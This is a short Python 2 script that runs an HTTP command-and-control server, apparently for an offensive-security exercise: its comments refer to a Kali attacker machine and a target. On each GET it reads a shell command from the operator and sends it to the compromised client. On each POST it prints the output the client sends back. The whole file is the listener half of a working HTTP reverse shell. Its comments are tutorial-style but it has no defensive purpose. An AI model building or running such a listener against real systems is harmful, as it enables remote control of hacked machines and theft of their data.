

import BaseHTTPServer # Built-in library we use to build simple HTTP server 

HOST_NAME = '0.0.0.0' # Kali IP address 
PORT_NUMBER = 80 # Listening port number 


class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler): # MyHandler defines what we should do when we receive a GET/POST request
                                                          # from the client / target

    def do_GET(s):
                                         
        command = raw_input("Shell> ") 
        s.send_response(200) 
        s.send_header("Content-type", "text/html") 
        s.end_headers()
        s.wfile.write(command) 

            
    def do_POST(s):
                                                     #If we got a POST, we will:- 
        s.send_response(200) #return HTML status 200 (OK)
        s.end_headers()
        length = int(s.headers['Content-Length']) #Define the length which means how many bytes the HTTP POST data contains, the length
                                                     #value has to be integer 
        postVar = s.rfile.read(length) # Read then print the posted data
        print postVar
        
        

if __name__ == '__main__':


   
    
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)


    
    try: 
     httpd.serve_forever() 
    except KeyboardInterrupt: 
        print '[!] Server is terminated'
        httpd.server_close()